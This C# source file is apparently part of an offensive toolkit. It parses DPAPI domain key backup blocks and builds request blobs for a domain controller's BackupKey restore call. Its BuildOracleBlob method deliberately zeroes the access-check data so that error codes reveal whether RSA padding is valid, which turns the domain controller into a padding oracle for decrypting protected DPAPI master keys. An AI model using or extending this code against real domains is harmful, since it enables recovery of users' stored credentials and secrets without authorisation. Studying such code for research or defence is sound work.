using System;
using System.Buffers.Binary;
using System.IO;
using System.Text;

namespace Titanis.Tbo.Smb2.PowerShell
{
	// [MS-BKRP] § 2.2.2 - DPAPI_MASTER_KEY_PACK_DOMAINS_V2 / V3
	internal sealed class DpapiDomainKeyBlock
	{
		// Version 2 = 3DES+SHA1, Version 3 = AES256+SHA512 (Win 2012+)
		public uint Version { get; init; }

		// GUID of the DC backup key that can decrypt SecretData
		public Guid BackupKeyGuid { get; init; }

		// RSA ciphertext stored in little-endian byte order (as in the file)
		public byte[] SecretData { get; init; } = Array.Empty<byte>();

		// Symmetrically-encrypted access-check blob (3DES for v2, AES-256 for v3)
		public byte[] AccessCheck { get; init; } = Array.Empty<byte>();

		public static DpapiDomainKeyBlock Parse(byte[] raw)
		{
			if (raw == null || raw.Length < 28)
				throw new InvalidDataException("DomainKey block is too short.");

			using var stream = new MemoryStream(raw, writable: false);
			using var reader = new BinaryReader(stream, Encoding.Unicode, leaveOpen: true);

			var version = reader.ReadUInt32();
			var secretLen = reader.ReadUInt32();
			var accessCheckLen = reader.ReadUInt32();
			var guidBytes = reader.ReadBytes(16);

			if (stream.Length - stream.Position < (long)(secretLen + accessCheckLen))
				throw new InvalidDataException("DomainKey block lengths exceed available data.");

			var secretData = reader.ReadBytes(checked((int)secretLen));
			var accessCheck = reader.ReadBytes(checked((int)accessCheckLen));
			var guid = new Guid(guidBytes);

			return new DpapiDomainKeyBlock
			{
				Version = version,
				BackupKeyGuid = guid,
				SecretData = secretData,
				AccessCheck = accessCheck
			};
		}

		// Build the input blob for BackuprKey(BACKUPKEY_RESTORE_GUID, ...).
		// For oracle queries the AccessCheck is zeroed so the DC's inner SID
		// verification always fails, giving us the observable error distinction.
		public byte[] BuildOracleBlob(byte[] rsaCiphertext)
		{
			if (rsaCiphertext == null) throw new ArgumentNullException(nameof(rsaCiphertext));

			int k = rsaCiphertext.Length;
			// version(4) + cbKey(4) + cbAccessCheck(4) + guid(16) + ct(k) + zeroed-accessCheck(64)
			var blob = new byte[12 + 16 + k + 64];
			BinaryPrimitives.WriteUInt32LittleEndian(blob.AsSpan(0), this.Version < 3 ? 2u : 3u);
			BinaryPrimitives.WriteUInt32LittleEndian(blob.AsSpan(4), (uint)k);
			BinaryPrimitives.WriteUInt32LittleEndian(blob.AsSpan(8), 64u);
			this.BackupKeyGuid.TryWriteBytes(blob.AsSpan(12));
			rsaCiphertext.CopyTo(blob, 28);
			// Last 64 bytes remain zeroed - triggers 0x0d (inner check fail) on valid padding
			return blob;
		}
	}
}
